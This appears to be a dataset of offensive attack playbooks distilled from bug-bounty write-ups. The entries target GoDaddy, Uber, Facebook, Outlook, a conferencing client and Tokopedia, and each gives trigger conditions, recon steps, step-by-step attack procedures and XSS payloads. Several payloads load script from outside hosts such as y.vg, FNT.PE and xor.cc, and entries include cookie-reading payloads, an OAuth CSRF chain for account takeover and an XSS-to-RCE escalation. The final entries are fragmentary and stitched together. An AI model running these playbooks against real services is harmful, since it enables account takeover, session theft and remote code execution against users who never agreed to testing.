skip_if: User profile fields are strictly sanitized and do not allow script execution.
No observable data reflection in administrative or customer support interfaces.

recon_steps: Step 1: Identify user-editable fields in the GoDaddy profile, specifically 'First Name' and 'Last Name'.
Step 2: Test these fields for basic XSS payloads like '<script>alert(1)</script>' to check for immediate reflection.
Step 3: If direct reflection isn't observed, use a blind XSS tool like XSS Hunter to inject a payload and monitor for callbacks.
attack_steps: Step 1: Navigate to the user profile settings on GoDaddy.
Step 2: In the 'First Name' field, input a blind XSS payload that redirects to an XSS Hunter endpoint, e.g., `<script src=//y.vg></script>`.
Step 3: In the 'Last Name' field, input a similar blind XSS payload, e.g., `<script src=//y.vg></script>`.
Step 4: Save the profile changes.
Step 5: Wait for a callback from the XSS Hunter service, indicating the payload has been executed in another browser context.
Step 6: Analyze the DOM capture provided by XSS Hunter to confirm successful injection and identify the vulnerable component (e.g., customer support panel).
tools_recommended: XSS Hunter: To host payloads and detect blind XSS callbacks.
success_indicators: Receiving a callback from the XSS Hunter service.
DOM capture from XSS Hunter shows the payload executed within the GoDaddy customer support panel.
Customer support agent's screen displays JavaScript errors or altered content due to the injected payload.
failure_indicators: No XSS Hunter callback received after a reasonable waiting period (e.g., 24 hours). This could mean the fields are sanitized or not reflected in a vulnerable context.
Callback received, but the DOM capture shows the payload is not executed or is neutralized. Suggest trying different XSS payloads or focusing on other input vectors.

playbooks.impact: An attacker can execute arbitrary JavaScript within the browser of GoDaddy customer support agents. This allows the attacker to potentially steal session tokens, perform actions on behalf of the agent (e.g., modify account information, transfer domains, delete accounts), access sensitive customer data displayed in the support panel, and perform further client-side attacks.
playbooks.key_lesson: Always test user-editable fields for blind XSS, especially if their data is reflected in administrative interfaces, as these often have less stringent security controls.

meta.title: Uber turning self XSS to good XSS

trigger_conditions.when_to_apply: When a self-XSS vulnerability is found in a user's profile that is not shared with other users, and the application uses an OAuth login flow without a 'state' parameter in its callback.
prerequisites: Attacker has a registered Uber Partners account.
Victim is an authenticated user on the Uber Partners portal.
The application uses OAuth for login and the callback URL is vulnerable to CSRF.
applicability_signals: Self-XSS found in a user-specific profile field.
OAuth callback endpoint '/oauth/callback' exists.
OAuth callback URL does not contain a 'state' parameter.
Logout endpoint '/logout' exists and redirects to a central login domain.
skip_if: The self-XSS payload executes in a context that cannot be influenced by other users.
The OAuth callback includes a valid 'state' parameter, preventing CSRF.

recon_steps: Step 1: Identify a self-XSS vulnerability in a user's profile section of the Uber Partners portal.
Step 2: Inspect the OAuth login flow for the Uber Partners portal, specifically the '/oauth/callback' endpoint, to check for the absence of the 'state' parameter.
attack_steps: Step 1: Craft an HTML page that first logs the victim out of the 'partners.uber.com' session without logging them out of 'login.uber.com' using a Content Security Policy (CSP) meta tag to block the redirect to 'login.uber.com/logout'.
Step 2: Initiate the OAuth login flow by redirecting the victim to the Uber Partners login page, forcing them to the authorization server.
Step 3: The victim logs into their account on 'login.uber.com'.
Step 4: The victim is redirected back to 'partners.uber.com/oauth/callback?code=...' which is vulnerable to CSRF due to the missing 'state' parameter.

Step 5: Exploit the CSRF vulnerability to redirect the victim to an attacker-controlled endpoint (e.g., attacker's server) which then exchanges the code for an access token and subsequently uses the self-XSS payload within the victim's context.

Step 6: As the victim's session on 'partners.uber.com' is maintained (due to CSP blocking the full logout redirect), use the obtained access token to perform actions on behalf of the victim, potentially including data exfiltration or further actions guided by the self-XSS payload.
tools_recommended: Burp Suite: To intercept and analyze OAuth flow, craft CSRF payloads.
Custom HTML/JavaScript: To construct the attack page with CSP and redirection logic.
success_indicators: The victim's session on 'partners.uber.com' remains active after attempting logout.
The OAuth callback is successfully processed by the attacker's endpoint.
The self-XSS payload executes within the victim's browser context on 'partners.uber.com', as evidenced by actions performed or data exfiltrated.
failure_indicators: Victim is fully logged out of both 'partners.uber.com' and 'login.uber.com' and the payload doesn't execute.
The OAuth callback includes a 'state' parameter, blocking the CSRF exploit.
CSP policy is bypassed or not effective in blocking the logout redirect.

playbooks.impact: Allows an attacker to perform actions on behalf of any authenticated Uber Partners portal user, including accessing and exfiltrating sensitive user data, by chaining a self-XSS vulnerability with an OAuth CSRF vulnerability. This effectively leads to account takeover.
playbooks.key_lesson: Always validate OAuth callback parameters, especially the 'state' parameter, to prevent CSRF attacks that can elevate self-XSS vulnerabilities to full account compromise.

meta.title: XSS on facebook via png content types

trigger_conditions.when_to_apply: When an authenticated user can upload image files to Facebook, and the server does not properly sanitize or validate the Content-Type of the uploaded files, allowing them to be served as 'text/html'.
prerequisites: An active Facebook account.
The ability to upload files to Facebook.
applicability_signals: Uploaded image files are served from `akamaihd.net` or `fbcdn.net` domains.
The `Content-Type` header of uploaded images is not strictly enforced as `image/png` when accessed.
The `X-Content-Type-Options: nosniff` header is not present.
skip_if: Facebook enforces `Content-Type: image/png` for all image requests.
Facebook strips out or sanitizes script tags within image data before serving.

recon_steps: Step 1: Upload a standard PNG image to Facebook and observe the `Content-Type` header of the served image URL. Look for it to be `image/png`.
Step 2: Attempt to upload a PNG file with a modified extension (e.g., `.html`). If Facebook prevents this, note the restriction.
Step 3: Research techniques for embedding arbitrary data into PNG IDAT chunks that survive compression/decompression and potential server-side processing.
attack_steps: Step 1: Craft a malicious PNG file containing a JavaScript payload within its IDAT chunks. The payload should be designed to be executed when the image is interpreted as HTML (e.g., `<SCRIPT src=//FNT.PE></SCRIPT>`).
Step 2: Upload the crafted malicious PNG file to Facebook.
Step 3: Attempt to access the uploaded image URL. If successful, the browser should interpret the file as HTML and execute the embedded JavaScript.
Step 4: Verify execution by observing the expected behavior (e.g., an alert box, or a callback to an attacker-controlled server).
payloads_or_patterns: A specially crafted PNG file containing `<SCRIPT src=//FNT.PE></SCRIPT>` within its IDAT chunk.
tools_recommended: Custom script for brute-forcing DEFLATE compression to embed payload into PNG IDAT chunks.
Hex editor for inspecting PNG file structure.
Browser developer tools to inspect network requests and `Content-Type` headers.
success_indicators: The uploaded PNG file is served with a `Content-Type: text/html` header, or the browser interprets it as HTML despite being served as `image/png`.
The embedded JavaScript payload executes (e.g., an alert box appears, or a request is made to an attacker-controlled domain).
failure_indicators: The uploaded PNG file is rejected by Facebook during upload.
The uploaded PNG file is served with `Content-Type: image/png` and the embedded payload is not executed.
Facebook filters or sanitizes the PNG data, removing the JavaScript payload.

playbooks.impact: Remote Code Execution (via JavaScript injection) within the context of the user's Facebook session. This could lead to session hijacking, data exfiltration, unauthorized posting, or further phishing attacks.
playbooks.key_lesson: When processing user-uploaded files, always validate and strictly enforce the `Content-Type` header. Implement `X-Content-Type-Options: nosniff` to prevent MIME-sniffing attacks.

meta.title: XSS to RCE in <conf provider X>

tech_stack_fingerprints: uses Node.js (mentioned in relation to native app)

trigger_conditions.when_to_apply: When an XSS vulnerability is found in the user's name field for meetings within the <conf provider X> application, especially if meetings are unauthenticated and the native client is in use.
prerequisites: An XSS vulnerability in the 'first name' field of a meeting within <conf provider X>.
The target user is using the native OS X application or a client that executes `process.open`.
The target meeting ID is publicly known or guessable.
applicability_signals: XSS payload like ` ` executes in the 'first name' field.
The presence of the `<conf provider X>` desktop application on the target's system.
Meetings are joinable without authentication.
skip_if: Input sanitization strictly prevents any script execution or manipulation of the 'first name' field.
The target is only using web-based clients that do not support `process.open` or similar OS-level commands.
Meetings require strict authentication for all participants.

recon_steps: Step 1: Identify the target application and its potential meeting IDs (if publicly accessible or guessable).
Step 2: Test for XSS in the 'first name' field of a meeting by injecting payloads like ``.
Step 3: Determine if the native OS X application or a similar client is being used by potential victims, observing if `process.open` or similar functionalities are available.
attack_steps: Step 1: Craft an XSS payload that leverages `String.fromCharCode` to bypass potential filtering and execute JavaScript from an external source.
Step 2: Embed the payload within the 'first name' field of a meeting invite or by tricking a user into joining a meeting with the malicious name.
Step 3: For targets using the native client, the payload will attempt to execute `process.open` to launch applications.
Step 4: For web clients with jQuery, the payload will attempt to execute scripts from a remote URL using `$.getScript`.
tools_recommended: Burp Suite: For intercepting and modifying requests to test XSS payloads, and for observing network traffic for callbacks if remote scripts are used.
A simple HTTP server: To host the malicious JavaScript file (e.g., xor.cc) if not using a pre-existing one.
success_indicators: An alert box appearing on the victim's screen (indicating basic XSS).
The calculator application opening on the victim's OS X machine (indicating RCE via `process.open`).
Successful execution of the JavaScript fetched from `xor.cc`.
failure_indicators: No alert box appears, and no calculator opens, even with seemingly valid payloads (indicates input sanitization or lack of vulnerable client). Suggestion: Pivot to other XSS vectors or a different vulnerability class.

The XSS payload is reflected but does not trigger any further actions (e.g., `alert()` works, but `eval()` or `process.open` do not). Suggestion: Investigate client-side JavaScript for other execution sinks or bypasses.
WAF or security measures block the payload. Suggestion: Use obfuscation techniques or alternative XSS payloads.

playbooks.impact: Remote Code Execution (RCE) on the victim's machine, allowing the attacker to execute arbitrary commands, such as opening applications (e.g., Calculator), accessing files, or further compromising the system. The unauthenticated nature of meetings exacerbates this, making it possible to target any user joining a public or guessable meeting ID.
playbooks.key_lesson: Always consider the potential for XSS to escalate to RCE, especially in applications that utilize client-side JavaScript frameworks or have integrations with the operating system's native functionalities.

meta.title: Stored XSS in outlook.com (iOS browsers) via doc file

trigger_conditions.when_to_apply: When the target application allows uploading and rendering Microsoft Office documents (specifically PowerPoint 97-2003 format) and renders them within an iOS browser context. This technique is applicable when user-supplied content within documents can be rendered as executable code.
prerequisites: Attacker must have an Outlook account.
Target user must be using an iOS browser (Safari, Chrome, Firefox, Opera).
applicability_signals: The application accepts file uploads for attachment previews or rendering.
The application renders Office documents directly in the browser.
Targeting an iOS environment shows potential for platform-specific vulnerabilities.
skip_if: The application sanitizes or does not render the content of the attached document in a way that allows script execution.
The vulnerability is not present on non-iOS platforms.
The application rejects or does not process PowerPoint 97-2003 (.ppt) files.

recon_steps: Identify functionality within Outlook.com that allows uploading and previewing/rendering attached documents.
Investigate the specific file types that are processed and rendered by the application.
attack_steps: Step 1: Create a Microsoft Office document (e.g., a PowerPoint 97-2003 Presentation, .ppt) containing a hyperlink with a JavaScript payload. The payload used in the write-up was 'javascript:prompt(document.cookie)'.
Step 2: Save the crafted document in the 'Powerpoint Presentation 97-2003' format (.ppt).
Step 3: Log in to outlook.live.com, upload the specially crafted .ppt file, and send it via email to a target (or to yourself for testing).
Step 4: Log in to outlook.live.com using an iOS browser (e.g., Chrome on iPhone).
Step 5: Open the email containing the crafted document.
Step 6: Click on the attachment to open it.
Step 7: Click on the hyperlink within the rendered document.
Step 8: Observe the execution of the JavaScript payload (e.g., a prompt displaying document.cookie).
tools_recommended: Microsoft PowerPoint (or compatible editor) for crafting the malicious .ppt file.
Outlook.com for sending and receiving emails.
iOS device with a web browser (Chrome, Safari, Firefox, Opera).
success_indicators: Execution of the JavaScript payload, such as the appearance of a `prompt()` box displaying the user's cookies (`document.cookie`).
The attachment rendering process successfully embeds and executes the crafted hyperlink.
failure_indicators: The hyperlink does not execute JavaScript, and instead navigates to a URL or is rendered as plain text.
The .ppt file upload or rendering fails.
The prompt box does not appear, indicating the JavaScript payload was not executed. Pivot: Try different XSS payloads or different Office document types if supported.

playbooks.impact: An attacker can inject arbitrary JavaScript code into outlook.com, which is then executed in the context of the victim's browser when they open the malicious document. This can lead to session hijacking, data theft (e.g., cookies containing sensitive information), or further attacks if the victim has high privileges within Outlook.
playbooks.key_lesson: Always test basic JavaScript payloads like `javascript:prompt(document.cookie)` in file upload and rendering functionalities, especially when targeting specific client environments like iOS, as they can reveal significant vulnerabilities.

meta.title: Stil work redirect Yahoo subdomain XSS

meta.title: Multiple Stored XSS on Tokopedia

tech_stack_fingerprints: AngularJS (mentioned for one of the XSS vectors)

trigger_conditions.when_to_apply: When an authenticated user can input text into fields that are later displayed to other users or admin staff, or when application components are susceptible to injection through specific parameters.

User must be able to edit their shop's location.

The 'Location of shop' parameter on m.tokopedia.com.
The 'Etalase Name' field when adding or editing products.
The presence of a customer support system that processes user-generated content.

The application utilizes a Web Application Firewall (WAF) that effectively blocks common XSS vectors.
The specific features mentioned (complain, shop location, etalase name, CS system) are not present or accessible.

failure_indicators: The input is displayed as plain text without rendering HTML or executing JavaScript.

playbooks.impact: Execution of arbitrary JavaScript in the context of other users' browsers, allowing for session hijacking, data theft, redirection to malicious sites, or modification of displayed content.
